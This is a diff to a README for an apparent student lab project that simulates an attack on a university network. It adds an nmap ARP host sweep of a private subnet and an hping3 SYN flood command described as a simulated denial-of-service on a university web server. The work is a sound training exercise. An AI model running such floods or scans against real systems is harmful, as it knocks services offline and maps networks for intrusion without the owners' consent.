@@ -15,6 +15,8 @@ For the University Cyber Attack project, I assumed the role of a cyber security 
 
 <h2>Tools and Commands Used</h2>
 
+- <b>route</b>
+- <b>iconfig</b>
 - <b>Nmap</b>
 - <b>Hping3</b>
 - <b>WireShark</b>
@@ -37,10 +39,23 @@ Email Details Investigation: <br/>
 <br />
 <br />  
 Scanning Report of University Network: <br/>
+
+
+## Usage:
+    route
+## Usage:
+    ifconfig
+## Usage:
+    sudo nmap -PR -sn 192.168.20.0/24    
+    
 <img src="https://imgur.com/kd7wzP6.png" height="80%" width="80%" alt="Project walk-through"/>
 <br /> 
 <br />  
 DoS simulated Attack on University Website using Hping3: <br/>
+
+
+## Usage:
+    sudo hping3 -S --flood -V -p 135 192.168.20.14
 <img src="https://imgur.com/yxNUsHF.png" height="80%" width="80%" alt="Project walk-through"/>
 <br />
 <br />  
